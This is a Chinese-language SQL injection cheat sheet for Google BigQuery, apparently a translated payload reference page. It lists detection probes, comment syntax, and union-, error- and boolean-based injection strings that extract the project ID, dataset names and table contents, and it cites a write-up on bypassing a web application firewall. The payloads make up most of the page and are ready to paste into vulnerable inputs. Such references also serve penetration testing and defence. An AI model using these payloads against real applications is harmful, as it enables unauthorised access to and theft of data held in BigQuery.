# Google BigQuery SQL注入

## 摘要

* [检测](#检测)
* [BigQuery注释](#bigquery-注释)
* [基于BigQuery联合](#bigquery-联合-based)
* [基于BigQuery错误](#bigquery-错误-based)
* [基于BigQuery布尔值](#bigquery-布尔值-based)
* [基于BigQuery时间](#bigquery-时间-based)
* [参考资料](#参考资料)

## 检测

* 使用经典单引号触发错误：`'`
* 使用反引号表示法识别BigQuery：```SELECT .... FROM `` AS ...```

```ps1
# 收集项目ID
select @@project_id

# 收集所有数据集名称
select schema_name from INFORMATION_SCHEMA.SCHEMATA

# 从特定项目ID和数据集中收集数据
select * from `project_id.dataset_name.table_name`
```

## BigQuery注释

```ps1
select 1#从这里开始不起作用
select 1/*在这两者之间不起作用*/
```

## 基于BigQuery联合

```ps1
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

## 基于BigQuery错误

```ps1
# 基于错误 - 除零
' OR if(1/(length((select('a')))-1)=1,true,false) OR '

# 基于错误 - 转换：select CAST(@@project_id AS INT64)
dataset_name.column_name` union all select CAST(@@project_id AS INT64) ORDER BY 1 DESC#
```

## 基于BigQuery布尔值

```ps1
' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
```

## 基于BigQuery时间

* BigQuery语法中不存在基于时间的函数。

## 参考资料

* [BigQuery SQL注入备忘单 - Ozgur Alp - 2月14日](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
* [BigQuery文档 - 查询语法](https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax)
* [BigQuery文档 - 函数和操作符](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* [Akamai Web应用程序防火墙绕过之旅：利用“Google BigQuery”SQL注入漏洞 - 作者Duc Nguyen The, 2020年3月31日](https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/)